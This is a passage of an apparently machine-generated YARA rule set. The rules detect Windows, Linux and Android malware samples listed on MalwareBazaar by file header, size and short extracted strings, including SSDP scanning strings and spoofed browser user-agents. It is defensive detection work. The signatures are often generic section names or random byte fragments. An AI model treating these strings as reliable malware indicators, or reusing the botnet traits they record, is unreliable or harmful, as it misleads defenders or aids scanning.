        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "D$ RPh"
        $s5 = "MFC42.DLL"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 266KB
        and all of them
}

rule Windows_21a3834ec6d51ba3426b21c6fda50146e7e6d0ba774fcd03917f722ef33235dd
{
    meta:
        description = "Auto ML: 21a3834ec6d51ba3426b21c6fda50146e7e6d0ba774fcd03917f722ef33235dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "B.idata"
        $s3 = "@.themida"
        $s4 = "A6dj_JS`y"
        $s5 = "RjrzzT"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2824KB
        and all of them
}

rule Windows_21b6126cd5074ab948e240f171ea4ae44c56184c252689fcb120971761fe26ab
{
    meta:
        description = "Auto ML: 21b6126cd5074ab948e240f171ea4ae44c56184c252689fcb120971761fe26ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlH"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "D$ RPQ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 796KB
        and all of them
}

rule Windows_21c6dd94577eb8a7f102656f638e4bdbac0fdb457c6dbd902a474b9c8b42a201
{
    meta:
        description = "Auto ML: 21c6dd94577eb8a7f102656f638e4bdbac0fdb457c6dbd902a474b9c8b42a201"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "yxeTfQ"
        $s5 = "!\\RwTq"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 87KB
        and all of them
}

rule Windows_2255037ecaa8bae5f9f8635acc752d13d2bef93b2a8db06dcc19c56325fba36f
{
    meta:
        description = "Auto ML: 2255037ecaa8bae5f9f8635acc752d13d2bef93b2a8db06dcc19c56325fba36f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "|*SSQVj"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 340KB
        and all of them
}

rule Windows_22a65c8bfef865afa71b633009dd4a46ddccb793a241a183202179ec9066d674
{
    meta:
        description = "Auto ML: 22a65c8bfef865afa71b633009dd4a46ddccb793a241a183202179ec9066d674"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB
        and all of them
}

rule Linux_22ef62004c1ee82645bed2e01b86464929743e17c0083f830b29a4e27e97791d
{
    meta:
        description = "Auto ML: 22ef62004c1ee82645bed2e01b86464929743e17c0083f830b29a4e27e97791d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "S\\v_LI"
        $s4 = "0{okac"
        $s5 = "expano"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB
        and all of them
}

rule Windows_22f5e2f4e2d83020d7262d04aad452399600581280be58a9e2dafbf4b69f0f62
{
    meta:
        description = "Auto ML: 22f5e2f4e2d83020d7262d04aad452399600581280be58a9e2dafbf4b69f0f62"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 614KB
        and all of them
}

rule Windows_024715adc889874d81c6f54a1df09e9dc0e7f338eb92e699cc5ba0b2827a34e7
{
    meta:
        description = "Auto ML: 024715adc889874d81c6f54a1df09e9dc0e7f338eb92e699cc5ba0b2827a34e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8028KB
        and all of them
}

rule Windows_230a116655f27e771451e599073e25ccbc3bb560c6f041089d896966d253539c
{
    meta:
        description = "Auto ML: 230a116655f27e771451e599073e25ccbc3bb560c6f041089d896966d253539c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3477KB
        and all of them
}

rule Linux_238e8f61c028da657b511061851f38ad90e6ba7146a8f3d417b73af12b5ee20d
{
    meta:
        description = "Auto ML: 238e8f61c028da657b511061851f38ad90e6ba7146a8f3d417b73af12b5ee20d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4^UPX!d"
        $s2 = "bdfx=B5"
        $s3 = "7sdNM."
        $s4 = "\\U~D3UJ"
        $s5 = "br9ef/h'"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB
        and all of them
}

rule Linux_23b04d929921e7e881cc44481ac16d1e38d293e72c7b0db151ac4d18c5c9c374
{
    meta:
        description = "Auto ML: 23b04d929921e7e881cc44481ac16d1e38d293e72c7b0db151ac4d18c5c9c374"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "z\\pui?>b"
        $s2 = "B$,_ZCO"
        $s3 = "Kn=!NB"
        $s4 = "K]ufX^/"
        $s5 = "*W[ZAW"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB
        and all of them
}

rule Linux_23d0db910afaf3f6e17f79fa929f637c1482cda00e3ad4bf0448e9535154bd6e
{
    meta:
        description = "Auto ML: 23d0db910afaf3f6e17f79fa929f637c1482cda00e3ad4bf0448e9535154bd6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB
        and all of them
}

rule Windows_23d0ee7d7279e063ddbca86376557628ace23c767171798789cae2174767b31f
{
    meta:
        description = "Auto ML: 23d0ee7d7279e063ddbca86376557628ace23c767171798789cae2174767b31f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Y d^tja}h"
        $s5 = "b a[:ma}"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 366KB
        and all of them
}

rule Linux_23d7fba27c029e99af3b12f097408f4f05d9ace29b4a964ced0b301958ee363a
{
    meta:
        description = "Auto ML: 23d7fba27c029e99af3b12f097408f4f05d9ace29b4a964ced0b301958ee363a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sNlC/#|"
        $s2 = "Fu3Oca"
        $s3 = "dPV^`I"
        $s4 = "KNPRngxT)"
        $s5 = "0ty(Pe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB
        and all of them
}

rule Windows_23f2af12d94f4f4ad3809c443a3d1bb286bfd47b2a10c7efe682c5222bae7fc2
{
    meta:
        description = "Auto ML: 23f2af12d94f4f4ad3809c443a3d1bb286bfd47b2a10c7efe682c5222bae7fc2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1120KB
        and all of them
}

rule Windows_2404b71d604fb30ab5de233155e78e9110552259d132d24b3a62e6074bab910a
{
    meta:
        description = "Auto ML: 2404b71d604fb30ab5de233155e78e9110552259d132d24b3a62e6074bab910a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "jXh`?B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Windows_2424d5739411b1a48bdca1869745c8d4811cd6aefe37cb7bf264765c5c5070cb
{
    meta:
        description = "Auto ML: 2424d5739411b1a48bdca1869745c8d4811cd6aefe37cb7bf264765c5c5070cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".kuligaf"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB
        and all of them
}

rule Windows_242d4132ff4d598dcf4a9013477d69dd9bc28779b3415a9b60136efe19e53fb5
{
    meta:
        description = "Auto ML: 242d4132ff4d598dcf4a9013477d69dd9bc28779b3415a9b60136efe19e53fb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB
        and all of them
}

rule Windows_029fbcceb82323987309e3f0f2f3a6626b8dc2894c868f96bcb8105405018b69
{
    meta:
        description = "Auto ML: 029fbcceb82323987309e3f0f2f3a6626b8dc2894c868f96bcb8105405018b69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 130KB
        and all of them
}

rule Windows_245ab71d310473ead8437bc01a370dfd1497cf3866c9e4adddea277cc3ddacb5
{
    meta:
        description = "Auto ML: 245ab71d310473ead8437bc01a370dfd1497cf3866c9e4adddea277cc3ddacb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4469KB
        and all of them
}

rule Linux_247da4e7b039a6ef66e79e642a2d12e42d3a4a8b54de73fd03da4f0e76666f93
{
    meta:
        description = "Auto ML: 247da4e7b039a6ef66e79e642a2d12e42d3a4a8b54de73fd03da4f0e76666f93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = "e`\"Om'H"
        $s3 = "@fiMR_("
        $s4 = "fllcLX"
        $s5 = "uYM>\"i"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB
        and all of them
}

rule Windows_2490594b4bef9c760dec4dc7a84f7527b0b612951ac880e1d5783422fb2a361e
{
    meta:
        description = "Auto ML: 2490594b4bef9c760dec4dc7a84f7527b0b612951ac880e1d5783422fb2a361e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".didata"
        $s5 = ".rdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3496KB
        and all of them
}

rule Windows_24acaabe7d3a9df77b0d8dbdcf500d538a99f3128c65a740ef85fbcec6e78294
{
    meta:
        description = "Auto ML: 24acaabe7d3a9df77b0d8dbdcf500d538a99f3128c65a740ef85fbcec6e78294"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6062KB
        and all of them
}

rule Windows_24ca467f398c64c1f70011ffc53598f2f09971998e08e2267f39f06776afbb15
{
    meta:
        description = "Auto ML: 24ca467f398c64c1f70011ffc53598f2f09971998e08e2267f39f06776afbb15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Win32 .EXE."
        $s2 = ".MPRESS1"
        $s3 = ".MPRESS2H"
        $s4 = "diA/>K"
        $s5 = "uP)RM}"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6490KB
        and all of them
}

rule Windows_250e92900b50889eb179775b49d66ed912dcfe00b79c0e275cf2a5a54c5f0d41
{
    meta:
        description = "Auto ML: 250e92900b50889eb179775b49d66ed912dcfe00b79c0e275cf2a5a54c5f0d41"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6258KB
        and all of them
}

rule Linux_2515ccfd8d711ed45f684c62c5d3acfbbcbc13fa4e0f851e0656eb2d7ffc781c
{
    meta:
        description = "Auto ML: 2515ccfd8d711ed45f684c62c5d3acfbbcbc13fa4e0f851e0656eb2d7ffc781c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "fD$BfH"
        $s2 = "ff4Jfg"
        $s3 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s4 = "M-SEARCH * HTTP/1.1"
        $s5 = "HOST: 255.255.255.255:1900"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 195KB
        and all of them
}

rule Linux_251d0879dcafacb0046e514a4d8c93b0c6c65168711e8f8f9b621afbefd5c3e5
{
    meta:
        description = "Auto ML: 251d0879dcafacb0046e514a4d8c93b0c6c65168711e8f8f9b621afbefd5c3e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$TPhH"
        $s2 = "xAPPSh@"
        $s3 = "u%WWSS"
        $s4 = "t@;D$xu"
        $s5 = "wcQWUR"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 102KB
        and all of them
}

rule Windows_254f8d074c069e55870426682a68552a95faf35df76b024d7069ddccd7e58e76
{
    meta:
        description = "Auto ML: 254f8d074c069e55870426682a68552a95faf35df76b024d7069ddccd7e58e76"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ZXIS8%"
        $s5 = "l[kV8d"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5112KB
        and all of them
}

rule Windows_25526f42bedae2b4788fb2a547ca8a100770f2d0bf8f13b483899eaf52b92130
{
    meta:
        description = "Auto ML: 25526f42bedae2b4788fb2a547ca8a100770f2d0bf8f13b483899eaf52b92130"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "T+Od9aQ"
        $s3 = "J7];ft7t"
        $s4 = "uc0QMA"
        $s5 = "Z`%zt>w"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB
        and all of them
}

rule Linux_02b54e35d0385151a64d59d294017f8030c22b4e7ef1c457e49388af9babd896
{
    meta:
        description = "Auto ML: 02b54e35d0385151a64d59d294017f8030c22b4e7ef1c457e49388af9babd896"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Windows_25533568bd447e6b298d644fe78779096102bd5d4ad35d5ae2116c316b63ebb1
{
    meta:
        description = "Auto ML: 25533568bd447e6b298d644fe78779096102bd5d4ad35d5ae2116c316b63ebb1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.symtab"
        $s5 = "B.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 23395KB
        and all of them
}

rule Windows_2566feced03a4f1af9907d884e058cd6ec115a9b934a720851d063dbdea3ae9f
{
    meta:
        description = "Auto ML: 2566feced03a4f1af9907d884e058cd6ec115a9b934a720851d063dbdea3ae9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_2573875eb640d30e444267c83205418a14053dfb046782e3e36defec71cba8b5
{
    meta:
        description = "Auto ML: 2573875eb640d30e444267c83205418a14053dfb046782e3e36defec71cba8b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RQCWOIROIQJWZORIQOVITQNOCROIQWX"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 716KB
        and all of them
}

rule Linux_2588a07da2183878ad2a2b37fc29bce49fe497e1ab59c3dd5cc80538ea0a4d84
{
    meta:
        description = "Auto ML: 2588a07da2183878ad2a2b37fc29bce49fe497e1ab59c3dd5cc80538ea0a4d84"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RQSPVW"
        $s2 = "SVPhdV"
        $s3 = "SVWQRP"
        $s4 = "E$VRWP"
        $s5 = "xAPPSh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB
        and all of them
}

rule Windows_25a9de96069391e57c0bf588996be23f79094b389baa0d6479727b258b3c1753
{
    meta:
        description = "Auto ML: 25a9de96069391e57c0bf588996be23f79094b389baa0d6479727b258b3c1753"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich1K"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".gfids"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 29767KB
        and all of them
}

rule Windows_25b36aa737b21d09321370e76dd2540604e24f5a7f0992df779790a1171d08ec
{
    meta:
        description = "Auto ML: 25b36aa737b21d09321370e76dd2540604e24f5a7f0992df779790a1171d08ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1271KB
        and all of them
}

rule Windows_26063c78e5418610471a9f3a00a155d7d1e5b29856e1979ba3bdc42681a871d0
{
    meta:
        description = "Auto ML: 26063c78e5418610471a9f3a00a155d7d1e5b29856e1979ba3bdc42681a871d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 359KB
        and all of them
}

rule Android_26247bcb312c2e8610f440582b10d0468c9fb7f5cc3eb0e36491262539361b59
{
    meta:
        description = "Auto ML: 26247bcb312c2e8610f440582b10d0468c9fb7f5cc3eb0e36491262539361b59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "{EJ_MM"
        $s3 = "2cTqBc"
        $s4 = "J9?K_Po"
        $s5 = "e^Xjt~n"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3853KB
        and all of them
}

rule Windows_262f8a0bec693fefee2b30858530582d1d066c8200c32d2a14f8d745cba13235
{
    meta:
        description = "Auto ML: 262f8a0bec693fefee2b30858530582d1d066c8200c32d2a14f8d745cba13235"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3325KB
        and all of them
}

rule Linux_263999c1cc936d4a84801f7f66fe0b8a34180ac98bae69d43c23c8552e9da311
{
    meta:
        description = "Auto ML: 263999c1cc936d4a84801f7f66fe0b8a34180ac98bae69d43c23c8552e9da311"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "ns/'ZK"
        $s4 = "x)hw?K"
        $s5 = "pW4{kO"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 60KB
        and all of them
}

rule Linux_0311393f5cd90c578567881c484b1c0808b950c1f6455888234e3f4ff9da4580
{
    meta:
        description = "Auto ML: 0311393f5cd90c578567881c484b1c0808b950c1f6455888234e3f4ff9da4580"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 122KB
        and all of them
}

rule Windows_26680ffe5ffede770697186e8107ec7251f50414502e4574d39bee3cb67f156d
{
    meta:
        description = "Auto ML: 26680ffe5ffede770697186e8107ec7251f50414502e4574d39bee3cb67f156d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 676KB
        and all of them
}

rule Windows_26a281534bcbf467b36882cb224d95e6f93e6307bd4b6c82cfe16f1c4b30bc32
{
    meta:
        description = "Auto ML: 26a281534bcbf467b36882cb224d95e6f93e6307bd4b6c82cfe16f1c4b30bc32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Linux_26a7fb12ebe190da2a0b886ee84363dfd18a8dc8ad93e56140dcb29173117fb0
{
    meta:
        description = "Auto ML: 26a7fb12ebe190da2a0b886ee84363dfd18a8dc8ad93e56140dcb29173117fb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "/BQxHoQxB"
        $s4 = "HoPpHoP"
        $s5 = "kdHo(ta"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB
        and all of them
}

rule Windows_26bd4a40d12d5483b5cf8a0a2db0dddb151b0b3206079dcf2782834482a2c3b7
{
    meta:
        description = "Auto ML: 26bd4a40d12d5483b5cf8a0a2db0dddb151b0b3206079dcf2782834482a2c3b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 684KB
        and all of them
}

rule Windows_26ed54f0d441f0f3dd744f03f30d8f1fa01de0ed267df7b7fec4c9b2eab742d2
{
    meta:
        description = "Auto ML: 26ed54f0d441f0f3dd744f03f30d8f1fa01de0ed267df7b7fec4c9b2eab742d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 983KB
        and all of them
}

rule Windows_26f693ee7807e9a341eb9936519194f587d1bd2998fdb734d36cd62b9a46b8b1
{
    meta:
        description = "Auto ML: 26f693ee7807e9a341eb9936519194f587d1bd2998fdb734d36cd62b9a46b8b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Collection`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 689KB
        and all of them
}

rule Windows_273859ef9dc73be91fe0e0b46e8152b22e2a5e3f8fc9a8e5549e1f4002476dfd
{
    meta:
        description = "Auto ML: 273859ef9dc73be91fe0e0b46e8152b22e2a5e3f8fc9a8e5549e1f4002476dfd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
